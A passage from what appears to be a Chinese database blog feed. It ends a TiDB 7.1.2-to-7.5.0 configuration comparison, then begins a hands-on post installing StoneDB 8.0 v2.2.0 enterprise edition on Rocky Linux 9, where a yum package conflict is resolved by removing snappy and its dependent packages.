│https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_enable_check_constraint-%E4%BB%8E-v720-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│        8 │ global  │ variable │ tidb_enable_fast_table_check               │ NotFound                                                                 │ ON                                                                       │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_enable_fast_table_check-%E4%BB%8E-v720-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│        9 │ global  │ variable │ tidb_enable_tiflash_pipeline_model         │ NotFound                                                                 │ ON                                                                       │https://asktug.com/t/topic/1018634</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       10 │ global  │ variable │ tidb_expensive_txn_time_threshold          │ NotFound                                                                 │ 600                                                                      │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_expensive_txn_time_threshold-%E4%BB%8E-v720-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       11 │ global  │ variable │ tidb_gogc_tuner_max_value                  │ NotFound                                                                 │ 500                                                                      │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_gogc_tuner_max_value-%E4%BB%8E-v750-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       12 │ global  │ variable │ tidb_gogc_tuner_min_value                  │ NotFound                                                                 │ 100                                                                      │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_gogc_tuner_min_value-%E4%BB%8E-v750-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       13 │ global  │ variable │ tidb_opt_enable_mpp_shared_cte_execution   │ NotFound                                                                 │ OFF                                                                      │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_opt_enable_mpp_shared_cte_execution-%E4%BB%8E-v720-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       14 │ global  │ variable │ tidb_opt_enable_non_eval_scalar_subquery   │ NotFound                                                                 │ OFF                                                                      │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_opt_enable_non_eval_scalar_subquery-%E4%BB%8E-v730-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       15 │ global  │ variable │ tidb_opt_objective                         │ NotFound                                                                 │ moderate                                                                 │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_opt_objective-%E4%BB%8E-v740-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       16 │ global  │ variable │ tidb_runtime_filter_mode                   │ NotFound                                                                 │ OFF                                                                      │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_runtime_filter_mode-%E4%BB%8E-v720-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       17 │ global  │ variable │ tidb_runtime_filter_type                   │ NotFound                                                                 │ IN                                                                       │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_runtime_filter_type-%E4%BB%8E-v720-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       18 │ global  │ variable │ tidb_schema_version_cache_limit            │ NotFound                                                                 │ 16                                                                       │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_schema_version_cache_limit-%E4%BB%8E-v740-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       19 │ global  │ variable │ tidb_service_scope                         │ NotFound                                                                 │                                                                          │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_service_scope-%E4%BB%8E-v740-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       20 │ global  │ variable │ tidb_skip_missing_partition_stats          │ NotFound                                                                 │ ON                                                                       │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_skip_missing_partition_stats-%E4%BB%8E-v730-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       21 │ global  │ variable │ tiflash_mem_quota_query_per_node           │ NotFound                                                                 │ 0                                                                        │https://docs.pingcap.com/zh/tidb/stable/system-variables#tiflash_mem_quota_query_per_node-%E4%BB%8E-v740-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       22 │ global  │ variable │ tiflash_query_spill_ratio                  │ NotFound                                                                 │ 0.7                                                                      │https://docs.pingcap.com/zh/tidb/stable/system-variables#tiflash_query_spill_ratio-%E4%BB%8E-v740-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       23 │ global  │ variable │ tiflash_replica_read                       │ NotFound                                                                 │ all_replicas                                                             │https://docs.pingcap.com/zh/tidb/stable/system-variables#tiflash_replica_read-%E4%BB%8E-v730-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       24 │ global  │ variable │ tikv_client_read_timeout                   │ NotFound                                                                 │ 0                                                                        │https://docs.pingcap.com/zh/tidb/stable/system-variables#tikv_client_read_timeout-%E4%BB%8E-v740-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       25 │ global  │ tidb     │ enable-32bits-connection-id                │ NotFound                                                                 │ true                                                                     │https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file#enable-32bits-connection-id-%E4%BB%8E-v730-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       26 │ global  │ tidb     │ in-mem-slow-query-recent-num               │ NotFound                                                                 │ 500                                                                      │https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file#in-mem-slow-query-recent-num-%E4%BB%8E-v730-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       27 │ global  │ tidb     │ in-mem-slow-query-topn-num                 │ NotFound                                                                 │ 30                                                                       │https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file#in-mem-slow-query-topn-num-%E4%BB%8E-v730-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       28 │ global  │ tidb     │ instance.tidb_expensive_txn_time_threshold │ NotFound                                                                 │ 600                                                                      │https://asktug.com/t/topic/1018636</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       29 │ global  │ tidb     │ instance.tidb_service_scope                │ NotFound                                                                 │                                                                          │https://asktug.com/t/topic/1018636</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       30 │ global  │ tidb     │ tikv-client.copr-req-timeout               │ NotFound                                                                 │ 60000000000                                                              │https://asktug.com/t/topic/1018632</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       31 │ global  │ variable │ tidb_analyze_partition_concurrency         │ 1                                                                        │ 2                                                                        │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_analyze_partition_concurrency</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       32 │ global  │ variable │ tidb_build_stats_concurrency               │ 4                                                                        │ 2                                                                        │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_build_stats_concurrency</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       33 │ global  │ variable │ tidb_remove_orderby_in_subquery            │ OFF                                                                      │ ON                                                                       │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_remove_orderby_in_subquery-%E4%BB%8E-v610-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       34 │ global  │ variable │ version                                    │ 5.7.25-TiDB-v7.1.2                                                       │ 8.0.11-TiDB-v7.5.0                                                       │https://docs.pingcap.com/zh/tidb/stable/system-variables#version</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       35 │ global  │ variable │ version_comment                            │ TiDB Server (Apache License 2.0) Community Edition, MySQL 5.7 compatible │ TiDB Server (Apache License 2.0) Community Edition, MySQL 8.0 compatible │https://asktug.com/t/topic/1018635</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       36 │ global  │ tidb     │ log.file.filename                          │ /root/.tiup/data/7.1.2/tidb-0/tidb.log                                   │ /root/.tiup/data/7.5/tidb-0/tidb.log                                     │</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       37 │ global  │ tidb     │ performance.enable-stats-cache-mem-quota   │ false                                                                    │ true                                                                     │https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file#enable-stats-cache-mem-quota-%E4%BB%8E-v610-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       38 │ global  │ tidb     │ performance.force-init-stats               │ false                                                                    │ true                                                                     │https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file#force-init-stats-%E4%BB%8E-v710-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│       39 │ global  │ tidb     │ performance.lite-init-stats                │ false                                                                    │ true                                                                     │https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file#lite-init-stats-%E4%BB%8E-v710-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">└──────────┴─────────┴──────────┴────────────────────────────────────────────┴──────────────────────────────────────────────────────────────────────────┴──────────────────────────────────────────────────────────────────────────┘</span><br><span class="line">[root@rocky9 tidb_config_diff]# </span><br></pre></td></tr></table></figure></div>
<p>–&gt;</p>
<p>此外， 需要注意的是，如下系统变量已被废弃，请勿使用。</p>
<ul>
<li><code>tidb_enable_fast_analyze</code></li>
<li><code>tidb_enable_tiflash_pipeline_model</code></li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> tidb_enable_fast_analyze<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">0.071</span> sec)</span><br><span class="line"></span><br><span class="line">Warning (Code <span class="number">1105</span>): the fast analyze feature has already been removed <span class="keyword">in</span> TiDB v7<span class="number">.5</span><span class="number">.0</span>, so this will have <span class="keyword">no</span> effect</span><br><span class="line">MySQL [(<span class="keyword">none</span>)]<span class="operator">&gt;</span></span><br><span class="line">MySQL [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> tidb_enable_tiflash_pipeline_model<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">0.013</span> sec)</span><br><span class="line"></span><br><span class="line">Warning (Code <span class="number">1681</span>): tidb_enable_tiflash_pipeline_model <span class="keyword">is</span> deprecated <span class="keyword">and</span> will be removed <span class="keyword">in</span> a future release.</span><br></pre></td></tr></table></figure></div>
<h2 id="尾声">尾声</h2>
<p>今年第二个 LTS 版本 TiDB v7.5.0 LTS 已发布上线，欢迎各位 TiDBer 来尝鲜、试用、推生产、升级生产。</p>
<h2 id="参考阅读">参考阅读</h2>
<ul>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/smooth-upgrade-tidb#%E4%BD%BF%E7%94%A8%E9%99%90%E5%88%B6" >平滑升级 TiDB 的限制 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 7.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>pingcap</tag>
        <tag>tidb 7.x</tag>
        <tag>ddl</tag>
      </tags>
  </entry>
  <entry>
    <title>StoneDB 企业版 8.0-v2.2.0 初体验</title>
    <url>/2023/stonedb/stonedb-8.0-v2.2.0-ee/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>前段时间已经体验过 StoneDB 5.7 ，对这款石原子数据库也有了初步印象。尤其是 StoneDB 5.7 开源版本未适配 Rocky Linux 9 的情况下，编译安装遇到了若干问题，本文来看看 StoneDB 8.0 企业版在 Rocky 9 上是否安装顺利。</p>
<ul>
<li><a href="https://shawnyan.cn/2023/stonedb/stonedb-compile-on-rocky-9/">三天三夜的三更半夜! StoneDB on Rocky 9</a></li>
<li><a href="https://shawnyan.cn/2023/stonedb/stonedb-install/">StoneDB 初体验 | StoneDB-5.7-v1.0.4 安装及新特性速览</a></li>
</ul>
<h2 id="介绍">介绍</h2>
<p>StoneDB 是由石原子科技公司自主设计、研发的国内首款基于 MySQL 内核打造的开源 HTAP（Hybrid Transactional and Analytical Processing）融合型数据库，可实现与 MySQL 的无缝切换。StoneDB 具备超高性能、实时分析等特点，为用户提供一站式 HTAP 解决方案。</p>
<p>StoneDB 100% 兼容 MySQL 5.6、5.7、8.0 协议和 MySQL 生态等重要特性，支持 MySQL 常用的功能及语法，支持 MySQL 生态中的系统工具和客户端，如 Navicat、Workbench、mysqldump、mydumper。由于 100% 兼容 MySQL，因此 StoneDB 的所有工作负载都可以继续使用 MySQL 数据库体系运行。</p>
<p>StoneDB 专门针对 OLAP 应用程序进行了设计和优化，支持百亿数据场景下进行高性能、多维度字段组合的复杂查询，相对比社区版的 MySQL，其查询速度提升了十倍以上。</p>
<p>StoneDB 采用基于知识网格技术和列式存储引擎，该存储引擎为海量数据背景下 OLAP 应用而设计，通过列式存储数据、知识网格过滤、高效数据压缩等技术，为应用系统提供低成本和高性能的数据查询支持。</p>
<img  alt="stonedbarch.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231205-56490e85-ee65-4a41-95d3-6d43a3c35df1.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="Release-Notes">Release Notes</h3>
<p>11月30日，石原子科技正式发布 StoneDB-8.0-V2.2.0 企业版。</p>
<img  alt="stonedb.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231205-d8e4747d-22dd-41cc-ae61-f39577303f1e.png"
                      referrerpolicy="no-referrer"
                >
<p>Release Notes for StoneDB-ee-8.0-v2.2.0</p>
<ol>
<li>New Futures</li>
</ol>
<ul>
<li>支持自定义函数create/drop function</li>
<li>支持存储过程create/drop procedurecall procedure</li>
<li>支持触发器create/drop trigger</li>
<li>支持alter table rename table_name2</li>
<li>支持select into out file</li>
<li>支持unsiged singed zerofill等列属性</li>
<li>Read Committed 隔离级实现</li>
</ul>
<ol start="2">
<li>Bug Fixes</li>
</ol>
<ul>
<li>主从功能对NULL处理错误</li>
<li>Release 版本 init db 失败</li>
<li>存储过程执行后，查询导致 core</li>
<li>drop table 不能正确删除</li>
<li>Item::send 对 decimal 处理不完全，导致 decimal(5,3)  结果显示 null</li>
<li>使用 with as 导致 core</li>
<li>部分子查询导致 core</li>
<li>主从复制中，double 数据插入错误</li>
<li>TPC-H Q8 error</li>
<li>备库同步失败导致 core</li>
<li>备库同步，切换db后，建表失败</li>
<li>传入错误的指针，导致 slave mode stop</li>
</ul>
<ol start="3">
<li>Refactors</li>
</ol>
<ul>
<li>重构对 MySQL 标识符`的支持</li>
<li>重构 create table 语句的 SQL 支持</li>
</ul>
<ol start="4">
<li>性能优化</li>
</ol>
<ul>
<li>备库insert同步性能提升1-2倍</li>
</ul>
<h2 id="环境信息">环境信息</h2>
<p>本文所使用的是最新的 StoneDB 8.0 v2.2.0 企业版，目前 StoneDB-8.0-V2.2.0 企业版正在免费公测中，下载地址为： <a class="link"   href="https://www.stoneatom.com/download" >StoneAtom 软件下载中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这里选择 【8.0-v2.2.0 RPM】： <a class="link"   href="https://stoneatom-static.oss-cn-hangzhou.aliyuncs.com/stonedb-ee-8.0-v2.2.0.el8.x86_64.rpm" >https://stoneatom-static.oss-cn-hangzhou.aliyuncs.com/stonedb-ee-8.0-v2.2.0.el8.x86_64.rpm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>可以看到这个 RPM 包适配的是 el8，理论上也是可以安装在 Rocky 9 上的，我们来尝试一下。</p>
<p>主机安装的系统为 Rocky Linux 9.3，关于 Rocky 9 的安装，可参考文章：</p>
<ul>
<li><a class="link"   href="https://www.modb.pro/db/1716634949384757248" >【Rocky 9】Step by Step 安装 Rocky Linux 9.2 系统 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/1726849694440185856" >【Rocky 9】Rocky Linux 9.2 升级 9.3，及新特性实践 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="Q1-OS-适配">Q1: OS 适配</h3>
<p>如果操作系统是 EL 系，除了 RPM 格式，还有 TAR 格式的安装包可以选，</p>
<p>【8.0-v2.2.0 TAR】： <a class="link"   href="https://stoneatom-static.oss-cn-hangzhou.aliyuncs.com/stonedb-ee-8.0-v2.2.0.el7.x86_64.tar.gz" >https://stoneatom-static.oss-cn-hangzhou.aliyuncs.com/stonedb-ee-8.0-v2.2.0.el7.x86_64.tar.gz <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>可以看到 RPM 适配的是 el8 系统，而 TAR 包适配的是 el7。<br>
这里建议提供不同版本操作系统不同格式的包，比如，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">stonedb-ee-8.0-v2.2.0.el9.x86_64.rpm</span><br><span class="line">stonedb-ee-8.0-v2.2.0.el8.x86_64.rpm</span><br><span class="line">stonedb-ee-8.0-v2.2.0.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">stonedb-ee-8.0-v2.2.0.el9.x86_64.tar.gz</span><br><span class="line">stonedb-ee-8.0-v2.2.0.el8.x86_64.tar.gz</span><br><span class="line">stonedb-ee-8.0-v2.2.0.el7.x86_64.tar.gz</span><br></pre></td></tr></table></figure></div>
<h2 id="安装-StoneDB">安装 StoneDB</h2>
<h3 id="安装-RPM">安装 RPM</h3>
<p>直接通过 yum 进行安装 RPM 包：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 stonedb]$ ls</span><br><span class="line">stonedb-ee-8.0-v2.2.0.el8.x86_64.rpm</span><br><span class="line">[shawnyan@rocky9 stonedb]$ sudo yum install ./stonedb-ee-8.0-v2.2.0.el8.x86_64.rpm</span><br><span class="line">Last metadata expiration check: 1:31:49 ago on Tue 05 Dec 2023 01:02:18 PM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">================================================================================</span><br><span class="line"> Package            Architecture  Version             Repository           Size</span><br><span class="line">================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> stonedb_2.0        x86_64        2.2.0-1.el8         @commandline        434 M</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install  1 Package</span><br><span class="line"></span><br><span class="line">Total size: 434 M</span><br><span class="line">Installed size: 1.1 G</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">Downloading Packages:</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Error: Transaction test error:</span><br><span class="line">  file /usr/lib64/libsnappy.so.1 from install of stonedb_2.0-2.2.0-1.el8.x86_64 conflicts with file from package snappy-1.1.8-8.el9.x86_64</span><br></pre></td></tr></table></figure></div>
<p>这里遇到了冲突，这里先将 <code>snappy</code> 卸载。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 stonedb]$ sudo yum remove snappy-1.1.8-8.el9.x86_64</span><br><span class="line">Dependencies resolved.</span><br><span class="line">================================================================================</span><br><span class="line"> Package                       Arch   Version                  Repository  Size</span><br><span class="line">================================================================================</span><br><span class="line">Removing:</span><br><span class="line"> snappy                        x86_64 1.1.8-8.el9              @anaconda   63 k</span><br><span class="line">Removing dependent packages:</span><br><span class="line"> cockpit                       x86_64 300.1-1.el9_3            @baseos     58 k</span><br><span class="line"> cockpit-storaged              noarch 300.1-1.el9_3            @appstream 882 k</span><br><span class="line"> cockpit-system                noarch 300.1-1.el9_3            @baseos    5.2 M</span><br><span class="line"> kexec-tools                   x86_64 2.0.26-8.el9             @baseos    1.3 M</span><br><span class="line"> snappy-devel                  x86_64 1.1.8-8.el9              @devel      44 k</span><br><span class="line">Removing unused dependencies:</span><br><span class="line"> clevis                        x86_64 18-112.el9               @appstream 122 k</span><br><span class="line"> clevis-luks                   x86_64 18-112.el9               @appstream  71 k</span><br><span class="line"> device-mapper-multipath       x86_64 0.8.7-22.el9             @baseos    320 k</span><br><span class="line"> device-mapper-multipath-libs  x86_64 0.8.7-22.el9             @baseos    876 k</span><br><span class="line"> dracut-network                x86_64 057-44.git20230822.el9   @baseos    190 k</span><br><span class="line"> dracut-squash                 x86_64 057-44.git20230822.el9   @baseos    3.2 k</span><br><span class="line"> iscsi-initiator-utils         x86_64 6.2.1.4-3.git2a8f9d8.el9 @anaconda  1.5 M</span><br><span class="line"> iscsi-initiator-utils-iscsiuio</span><br><span class="line">                               x86_64 6.2.1.4-3.git2a8f9d8.el9 @anaconda  189 k</span><br><span class="line"> isns-utils-libs               x86_64 0.101-4.el9              @anaconda  488 k</span><br><span class="line"> jose                          x86_64 11-3.el9                 @AppStream 134 k</span><br><span class="line"> jq                            x86_64 1.6-15.el9               @appstream 408 k</span><br><span class="line"> libblockdev-lvm               x86_64 2.28-7.el9               @appstream  68 k</span><br><span class="line"> libjose                       x86_64 11-3.el9                 @AppStream 154 k</span><br><span class="line"> libluksmeta                   x86_64 9-12.el9                 @AppStream  46 k</span><br><span class="line"> luksmeta                      x86_64 9-12.el9                 @AppStream  32 k</span><br><span class="line"> oniguruma                     x86_64 6.9.6-1.el9.5            @AppStream 746 k</span><br><span class="line"> python3-dasbus                noarch 1.4-5.el9                @AppStream 329 k</span><br><span class="line"> setroubleshoot-plugins        noarch 3.3.14-4.el9             @AppStream 2.5 M</span><br><span class="line"> setroubleshoot-server         x86_64 3.3.32-1.el9             @appstream 1.3 M</span><br><span class="line"> squashfs-tools                x86_64 4.4-8.git1.el9           @anaconda  420 k</span><br><span class="line"> tpm2-tools                    x86_64 5.2-3.el9                @baseos    1.4 M</span><br><span class="line"> udisks2-iscsi                 x86_64 2.9.4-9.el9              @appstream  56 k</span><br><span class="line"> udisks2-lvm2                  x86_64 2.9.4-9.el9              @appstream 104 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Remove  29 Packages</span><br><span class="line"></span><br><span class="line">Freed space: 19 M</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">...</span><br><span class="line">Removed:</span><br><span class="line">  clevis-18-112.el9.x86_64</span><br><span class="line">  clevis-luks-18-112.el9.x86_64</span><br><span class="line">  cockpit-300.1-1.el9_3.x86_64</span><br><span class="line">  cockpit-storaged-300.1-1.el9_3.noarch</span><br><span class="line">  cockpit-system-300.1-1.el9_3.noarch</span><br><span class="line">  device-mapper-multipath-0.8.7-22.el9.x86_64</span><br><span class="line">  device-mapper-multipath-libs-0.8.7-22.el9.x86_64</span><br><span class="line">  dracut-network-057-44.git20230822.el9.x86_64</span><br><span class="line">  dracut-squash-057-44.git20230822.el9.x86_64</span><br><span class="line">  iscsi-initiator-utils-6.2.1.4-3.git2a8f9d8.el9.x86_64</span><br><span class="line">  iscsi-initiator-utils-iscsiuio-6.2.1.4-3.git2a8f9d8.el9.x86_64</span><br><span class="line">  isns-utils-libs-0.101-4.el9.x86_64</span><br><span class="line">  jose-11-3.el9.x86_64</span><br><span class="line">  jq-1.6-15.el9.x86_64</span><br><span class="line">  kexec-tools-2.0.26-8.el9.x86_64</span><br><span class="line">  libblockdev-lvm-2.28-7.el9.x86_64</span><br><span class="line">  libjose-11-3.el9.x86_64</span><br><span class="line">  